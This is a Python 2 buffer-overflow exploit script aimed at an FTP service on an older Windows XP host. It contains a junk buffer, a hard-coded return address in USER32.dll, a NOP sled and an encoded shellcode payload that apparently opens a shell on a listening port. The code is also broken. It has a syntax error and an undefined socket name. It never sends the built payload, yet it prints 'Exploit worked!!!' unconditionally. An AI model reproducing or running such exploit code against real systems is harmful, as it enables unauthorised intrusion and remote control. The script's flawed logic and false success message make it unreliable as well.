import socket
import sys

if len(sys.argv <3:
	print "[!] You need to provide the IP and port"
	print "[-] e.g % 192.168.56.102 21" % sys.argv[0]
	sys.exit()
else:
	target = sys.argv[1]
	port = int(sys.argv[2])

try:
	print "[+] Connecting to the target"
	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	socket.setdefaulttimeout(10)
	soc.connect((target, port))

	print "[+] Received banner"
	print sock.recv(1024)

except Exception as err:
	print "[!] Connection failed"
	print err

###=============================================

junk1 = "\x41"*230

eip = "\x53\x93\x42\x7E"  #v5.1.2600.5512(C:\WINDOWS\system32\USER32.dll


buf =  ""
buf += "\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\xad\x8c\x18\xf0\x83\xee\xfc\xe2\xf4\x51\x64"
buf += "\x9a\xf0\xad\x8c\x78\x79\x48\xbd\xd8\x94\x26\xdc\x28"
buf += "\x7b\xff\x80\x93\xa2\xb9\x07\x6a\xd8\xa2\x3b\x52\xd6"
buf += "\x9c\x73\xb4\xcc\xcc\xf0\x1a\xdc\x8d\x4d\xd7\xfd\xac"
buf += "\x4b\xfa\x02\xff\xdb\x93\xa2\xbd\x07\x52\xcc\x26\xc0"
buf += "\x09\x88\x4e\xc4\x19\x21\xfc\x07\x41\xd0\xac\x5f\x93"
buf += "\xb9\xb5\x6f\x22\xb9\x26\xb8\x93\xf1\x7b\xbd\xe7\x5c"
buf += "\x6c\x43\x15\xf1\x6a\xb4\xf8\x85\x5b\x8f\x65\x08\x96"
buf += "\xf1\x3c\x85\x49\xd4\x93\xa8\x89\x8d\xcb\x96\x26\x80"
buf += "\x53\x7b\xf5\x90\x19\x23\x26\x88\x93\xf1\x7d\x05\x5c"
buf += "\xd4\x89\xd7\x43\x91\xf4\xd6\x49\x0f\x4d\xd3\x47\xaa"
buf += "\x26\x9e\xf3\x7d\xf0\xe4\x2b\xc2\xad\x8c\x70\x87\xde"
buf += "\xbe\x47\xa4\xc5\xc0\x6f\xd6\xaa\x73\xcd\x48\x3d\x8d"
buf += "\x18\xf0\x84\x48\x4c\xa0\xc5\xa5\x98\x9b\xad\x73\xcd"
buf += "\xa0\xfd\xdc\x48\xb0\xfd\xcc\x48\x98\x47\x83\xc7\x10"
buf += "\x52\x59\x8f\x9a\xa8\xe4\xd8\x58\x95\xea\x70\xf2\xad"
buf += "\xaf\x9a\x79\x4b\xe6\x08\xa6\xfa\xe4\x81\x55\xd9\xed"
buf += "\xe7\x25\x28\x4c\x6c\xfc\x52\xc2\x10\x85\x41\xe4\xe8"
buf += "\x45\x0f\xda\xe7\x25\xc5\xef\x75\x94\xad\x05\xfb\xa7"
buf += "\xfa\xdb\x29\x06\xc7\x9e\x41\xa6\x4f\x71\x7e\x37\xe9"
buf += "\xa8\x24\xf1\xac\x01\x5c\xd4\xbd\x4a\x18\xb4\xf9\xdc"
buf += "\x4e\xa6\xfb\xca\x4e\xbe\xfb\xda\x4b\xa6\xc5\xf5\xd4"
buf += "\xcf\x2b\x73\xcd\x79\x4d\xc2\x4e\xb6\x52\xbc\x70\xf8"
buf += "\x2a\x91\x78\x0f\x78\x37\xe8\x45\x0f\xda\x70\x56\x38"
buf += "\x31\x85\x0f\x78\xb0\x1e\x8c\xa7\x0c\xe3\x10\xd8\x89"
buf += "\xa3\xb7\xbe\xfe\x77\x9a\xad\xdf\xe7\x25"


nops = "\x90"*16
junk2 = "\x43"*64

username = "hacker"

try:
	print"[+] Sending Exploit"
	soc.send("USER " + username + "\r\n")
	soc.close()
except Exception as err:
	print "[!] Exploit failed"
	sys.exit()

print "[+] Exploit worked!!!"
print "\t[-]Connect to port 90900n the host"
